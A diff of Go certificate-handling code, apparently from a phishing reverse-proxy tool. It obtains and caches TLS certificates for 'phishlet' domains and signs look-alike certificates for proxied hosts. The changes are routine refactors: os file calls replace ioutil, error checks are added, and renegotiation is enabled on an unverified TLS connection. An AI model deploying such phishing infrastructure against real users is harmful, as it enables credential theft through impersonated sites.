@@ -9,7 +9,6 @@ import (
 	"crypto/x509/pkix"
 	"encoding/pem"
 	"fmt"
-	"io/ioutil"
 	"math/big"
 	"os"
 	"path/filepath"
@@ -76,7 +75,7 @@ func (ch HTTPChallenge) CleanUp(domain, token, keyAuth string) error {
 
 const acmeURL = "https://acme-v02.api.letsencrypt.org/directory"
 
-//const acmeURL = "https://acme-staging-v02.api.letsencrypt.org/directory"
+// const acmeURL = "https://acme-staging-v02.api.letsencrypt.org/directory"
 
 func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*CertDb, error) {
 	d := &CertDb{
@@ -91,7 +90,7 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 	d.phishletCache = make(map[string]map[string]*tls.Certificate)
 	d.tls_cache = make(map[string]*tls.Certificate)
 
-	pkey_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "private.key"))
+	pkey_pem, err := os.ReadFile(filepath.Join(data_dir, "private.key"))
 	if err != nil {
 		// private key corrupted or not found, recreate and delete all public certificates
 		os.RemoveAll(filepath.Join(data_dir, "*"))
@@ -104,7 +103,7 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 			Type:  "RSA PRIVATE KEY",
 			Bytes: x509.MarshalPKCS1PrivateKey(d.PrivateKey),
 		})
-		err = ioutil.WriteFile(filepath.Join(data_dir, "private.key"), pkey_pem, 0600)
+		err = os.WriteFile(filepath.Join(data_dir, "private.key"), pkey_pem, 0600)
 		if err != nil {
 			return nil, err
 		}
@@ -120,7 +119,7 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 		}
 	}
 
-	ca_crt_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "ca.crt"))
+	ca_crt_pem, err := os.ReadFile(filepath.Join(data_dir, "ca.crt"))
 	if err != nil {
 		notBefore := time.Now()
 		aYear := time.Duration(10*365*24) * time.Hour
@@ -156,7 +155,7 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 			Type:  "CERTIFICATE",
 			Bytes: cert,
 		})
-		err = ioutil.WriteFile(filepath.Join(data_dir, "ca.crt"), ca_crt_pem, 0600)
+		err = os.WriteFile(filepath.Join(data_dir, "ca.crt"), ca_crt_pem, 0600)
 		if err != nil {
 			return nil, err
 		}
@@ -171,7 +170,7 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 }
 
 func (d *CertDb) Reset() {
-	d.certUser.Email = "" //hostmaster@" + d.cfg.GetBaseDomain()
+	d.certUser.Email = "" // hostmaster@" + d.cfg.GetBaseDomain()
 }
 
 func (d *CertDb) SetupHostnameCertificate(hostname string) error {
@@ -211,7 +210,7 @@ func (d *CertDb) loadHostnameCertificate(hostname string) error {
 }
 
 func (d *CertDb) obtainHostnameCertificate(hostname string) error {
-	if err := CreateDir(filepath.Join(d.dataDir, HOSTS_DIR), 0700); err != nil {
+	if err := CreateDir(filepath.Join(d.dataDir, HOSTS_DIR), 0700); err != nil { //nolint:gocritic // false positive
 		return err
 	}
 	crt_dir := filepath.Join(d.dataDir, HOSTS_DIR)
@@ -228,11 +227,11 @@ func (d *CertDb) obtainHostnameCertificate(hostname string) error {
 	}
 	d.addHostnameCertificate(hostname, &cert)
 
-	err = ioutil.WriteFile(filepath.Join(crt_dir, hostname+".crt"), cert_res.Certificate, 0600)
+	err = os.WriteFile(filepath.Join(crt_dir, hostname+".crt"), cert_res.Certificate, 0600)
 	if err != nil {
 		return err
 	}
-	err = ioutil.WriteFile(filepath.Join(crt_dir, hostname+".key"), cert_res.PrivateKey, 0600)
+	err = os.WriteFile(filepath.Join(crt_dir, hostname+".key"), cert_res.PrivateKey, 0600)
 	if err != nil {
 		return err
 	}
@@ -258,7 +257,7 @@ func (d *CertDb) SetupPhishletCertificate(site_name string, domains []string) er
 	return nil
 }
 
-func (d *CertDb) GetPhishletCertificate(site_name string, base_domain string) (*tls.Certificate, error) {
+func (d *CertDb) GetPhishletCertificate(site_name, base_domain string) (*tls.Certificate, error) {
 	m, ok := d.phishletCache[base_domain]
 	if ok {
 		cert, ok := m[site_name]
@@ -269,7 +268,7 @@ func (d *CertDb) GetPhishletCertificate(site_name string, base_domain string) (*
 	return nil, fmt.Errorf("certificate for phishlet '%s' and domain '%s' not found", site_name, base_domain)
 }
 
-func (d *CertDb) addPhishletCertificate(site_name string, base_domain string, cert *tls.Certificate) {
+func (d *CertDb) addPhishletCertificate(site_name, base_domain string, cert *tls.Certificate) {
 	_, ok := d.phishletCache[base_domain]
 	if !ok {
 		d.phishletCache[base_domain] = make(map[string]*tls.Certificate)
@@ -277,7 +276,7 @@ func (d *CertDb) addPhishletCertificate(site_name string, base_domain string, ce
 	d.phishletCache[base_domain][site_name] = cert
 }
 
-func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string) error {
+func (d *CertDb) loadPhishletCertificate(site_name, base_domain string) error {
 	crt_dir := filepath.Join(d.dataDir, base_domain)
 
 	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
@@ -288,8 +287,8 @@ func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string) e
 	return nil
 }
 
-func (d *CertDb) obtainPhishletCertificate(site_name string, base_domain string, domains []string) error {
-	if err := CreateDir(filepath.Join(d.dataDir, base_domain), 0700); err != nil {
+func (d *CertDb) obtainPhishletCertificate(site_name, base_domain string, domains []string) error {
+	if err := CreateDir(filepath.Join(d.dataDir, base_domain), 0700); err != nil { //nolint:gocritic // false positive
 		return err
 	}
 	crt_dir := filepath.Join(d.dataDir, base_domain)
@@ -306,11 +305,11 @@ func (d *CertDb) obtainPhishletCertificate(site_name string, base_domain string,
 
 	d.addPhishletCertificate(site_name, base_domain, &cert)
 
-	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
+	err = os.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
 	if err != nil {
 		return err
 	}
-	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
+	err = os.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
 	if err != nil {
 		return err
 	}
@@ -321,7 +320,7 @@ func (d *CertDb) obtainPhishletCertificate(site_name string, base_domain string,
 func (d *CertDb) registerCertificate(domains []string) (*certificate.Resource, error) {
 	var err error
 	d.certUser = CertUser{
-		Email: "", //hostmaster@" + d.cfg.GetBaseDomain(),
+		Email: "", // hostmaster@" + d.cfg.GetBaseDomain(),
 		key:   d.PrivateKey,
 	}
 
@@ -336,7 +335,10 @@ func (d *CertDb) registerCertificate(domains []string) (*certificate.Resource, e
 
 	d.httpChallenge = &HTTPChallenge{crt_db: d}
 
-	d.client.Challenge.SetHTTP01Provider(d.httpChallenge)
+	err = d.client.Challenge.SetHTTP01Provider(d.httpChallenge)
+	if err != nil {
+		return nil, err
+	}
 	d.client.Challenge.Remove(challenge.TLSALPN01)
 
 	reg, err := d.client.Registration.Register(registration.RegisterOptions{TermsOfServiceAgreed: true})
@@ -361,7 +363,7 @@ func (d *CertDb) registerCertificate(domains []string) (*certificate.Resource, e
 func (d *CertDb) getServerCertificate(host string, port int) *x509.Certificate {
 	log.Debug("Fetching TLS certificate from %s:%d ...", host, port)
 
-	config := tls.Config{InsecureSkipVerify: true}
+	config := tls.Config{InsecureSkipVerify: true, Renegotiation: tls.RenegotiateFreelyAsClient}
 	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
 	if err != nil {
 		log.Warning("Could not fetch TLS certificate from %s:%d: %s", host, port, err)
@@ -374,7 +376,7 @@ func (d *CertDb) getServerCertificate(host string, port int) *x509.Certificate {
 	return state.PeerCertificates[0]
 }
 
-func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
+func (d *CertDb) SignCertificateForHost(host, phish_host string, port int) (cert *tls.Certificate, err error) {
 	var x509ca *x509.Certificate
 	var template x509.Certificate
 
